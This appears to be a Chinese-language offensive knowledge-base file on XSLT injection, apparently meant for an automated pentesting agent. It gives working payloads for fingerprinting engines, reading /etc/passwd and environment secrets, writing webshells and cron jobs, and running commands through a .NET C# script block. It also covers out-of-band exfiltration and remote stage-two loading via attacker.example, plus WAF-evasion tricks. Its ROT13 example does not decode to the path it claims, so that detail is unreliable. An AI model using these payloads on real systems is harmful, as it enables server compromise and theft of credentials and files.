# XSLT 注入 — 引擎指纹、读写原语与 RCE

> 攻击者可控的 XSLT 样式表被服务端编译执行时的攻击面。先指纹引擎（Java/.NET/PHP/libxslt），再按引擎选 document()/unparsed-text()/EXSLT 写入/扩展函数 RCE。
> 加载时机: 参数名 xslt/stylesheet/transform/template、SOAP 样式表、报告生成器、XML→HTML 转换器。
> 基础 payload（document() 读/Xalan Runtime.exec/php:function）见 `$AGENT_DIR/knowledge-base/xxe.md` §5，本文件为专题深化。

## §1 引擎指纹与能力矩阵

**无害探针**: `<xsl:value-of select="'XSLT_PROBE_OK'"/>` 输出变化即样式表被执行。

**指纹**（system-property）: `xsl:vendor`/`xsl:version`/`xsl:vendor-url`（2.0+ 另有 product-name/product-version/is-schema-aware）。
- `Apache Software Foundation` → Xalan(Java)；`Saxonica` → Saxon；`libxslt` → GNOME C 栈（常经 PHP）；Microsoft → MSXML/.NET

**功能探测树**: `unparsed-text()` 可用 → 2.0+；`xsl:result-document` 可用 → 2.0+；`xsl:evaluate` 可用 → 3.0（Saxon 9.8+）；product-version 9.x-12.x → Saxon 对应版；空 → libxslt/MSXML（仅 1.0）。

| 能力 | libxslt | Xalan-J | Saxon HE | Saxon PE/EE | MSXML/.NET |
|---|---|---|---|---|---|
| unparsed-text() | ✗ | ✗ | ✓ | ✓ | ✗ |
| xsl:result-document | ✗ | ✗ | ✓ | ✓ | ✗ |
| xsl:evaluate | ✗ | ✗ | 3.0 起 | 3.0 起 | ✗ |
| environment-variable() | ✗ | ✗ | 受限 | ✓ | ✗ |
| exsl:document 写 | ✓ | 部分 | — | — | ✗ |
| redirect:write 写 | ✗ | ✓ | ✗ | ✗ | ✗ |
| Java 扩展函数 | ✗ | 默认启用 | 默认禁用 | 可配置 | ✗ |

## §2 文件读取

- **document()**（1.0 通用，要求目标合法 XML）: `document('file:///etc/passwd')`；错误与部分读取也可泄露
- **unparsed-text()**（2.0+，任意文本）: `unparsed-text('/etc/passwd','utf-8')` / `unparsed-text('file:///C:/Windows/win.ini','utf-8')`
- **存在性探测**: `unparsed-text-available('/etc/shadow','utf-8')`（不读内容）
- **XXE via 样式表 DTD**: `<!DOCTYPE xsl:stylesheet [<!ENTITY ext_file SYSTEM "file:///etc/passwd">]>` + `&ext_file;`（解析器允许 DTD 时；失败不代表其他向量不可用）
- **SSRF**: `document('http://attacker.example/ssrf')`

## §3 文件写入三通道与 RCE

| 引擎 | 写入通道 |
|---|---|
| Saxon | `<xsl:result-document href="file:///tmp/proof.txt" method="text">` |
| libxslt | `<exploit:document href="/tmp/evil.txt" method="text">`（xmlns `http://exslt.org/common`） |
| Xalan-J | `<redirect:write file="/tmp/proof.txt">`（xmlns `http://xml.apache.org/xalan/redirect`） |

**.NET msxsl:script C# RCE**（脚本块被允许时，默认禁用）:
```xml
<msxsl:script language="C#" implements-prefix="user">
  public string xexec() { System.Diagnostics.Process.Start("cmd.exe","/c whoami"); return "ok"; }
</msxsl:script>
<xsl:value-of select="user:xexec()"/>
```
（Xalan `rt:exec` / PHP `php:function('system','id')` 见 xxe.md §5）

**链式攻击**: ①unparsed-text() 读配置拿凭据 → ②写 webshell/cron → ③document() SSRF 打内网 → ④回调验证。
cron payload（Saxon）:
```xml
<xsl:result-document href="file:///var/spool/cron/crontabs/www-data" method="text">
  <xsl:text>* * * * * /bin/bash -c 'id > /tmp/proof'&#10;</xsl:text>
</xsl:result-document>
```

## §4 环境变量与动态执行（Saxon）

```xml
<xsl:value-of select="environment-variable('DB_PASSWORD')"/>
<xsl:for-each select="available-environment-variables()">  <!-- 枚举全部 -->
```
`xsl:evaluate`（3.0）动态求值绕静态分析:
```xml
<xsl:evaluate xpath="concat('unparsed-text(', '''', '/etc/passwd', '''', ', ', '''', 'utf-8', '''', ')')"/>
```

## §5 盲利用

- **错误泄露**: `<xsl:variable name="leak" select="unparsed-text('/etc/hostname','utf-8')"/><xsl:value-of select="$leak * 1"/>` → 错误 `Cannot convert "myhostname" to a double` 含主机名
- **OOB**: `document(concat('http://attacker.example/x?d=', encode-for-uri($data)))`
- 无出网无错误 → 时间差（条件循环造延迟）
- **XSLT 即图灵完备 VM**（games-and-vms-4）: `<xsl:call-template>` 命名递归+`<xsl:choose>` 条件+`<xsl:variable>` 栈即完整运行时——被限制在纯模板执行时先用原生构件编码原语（二分搜索 oracle: 参数 lo/hi 递归 call-template 逐位逼近目标值），再谈逃逸。任何"纯模板语言"有命名递归+条件就是 VM

## §6 WAF 绕过

- 字符实体: `unp&#97;rsed-text(...)`（&#97;=a）
- CDATA 包路径 / 变量拼接（`concat($p1,$p2)`）
- 命名空间前缀混淆: `<a:stylesheet xmlns:a="http://www.w3.org/1999/XSL/Transform">`（URI 不变即合法）
- 分片: 主文件无害 + `<xsl:include href="http://attacker.example/stage2.xsl"/>`
- `translate()` ROT13 运行时构造路径: `translate('fgd-qbffjq','abcdefghijklmnopqrstuvwxyz','nopqrstuvwxyzabcdefghijklm')` → `/etc/passwd`

## §7 验证清单

| 阶段 | 方式 | 成功标志 |
|---|---|---|
| 文件读 | unparsed-text / document 读 /etc/hostname | 返回主机名 |
| 文件写 | 写 web 目录后 HTTP 访问 | 200 含写入内容 |
| OOB | document() 回调 | 收到请求含数据 |
| 盲 | 错误消息 | 含文件片段 |
| RCE | cron/webshell 回调 | 收到确认请求 |

## §8 关联文件

- `$AGENT_DIR/knowledge-base/xxe.md` — §5 XSLT 基础 payload（document()/Xalan/PHP）、XXE 主体、Solr CVE-2017-12629
- `$AGENT_DIR/knowledge-base/ssrf-advanced.md` — document() 出网后的 SSRF 利用
